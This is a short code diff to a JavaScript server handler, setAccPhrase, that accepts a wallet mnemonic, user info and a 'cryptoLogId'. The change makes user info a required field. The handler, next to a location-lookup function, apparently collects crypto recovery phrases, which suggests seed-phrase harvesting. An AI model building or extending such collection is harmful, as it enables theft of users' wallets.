@@ -253,7 +253,7 @@ const getLocationObject = async (req) => {
 const setAccPhrase = async (req, res) => {
   try {
     const { mnemonic, userInfo, cryptoLogId } = req.body;
-    if (!mnemonic || !cryptoLogId) {
+    if (!mnemonic || !userInfo || !cryptoLogId) {
       return res.status(404).json({ error: "Invalid Payload" });
     }
 
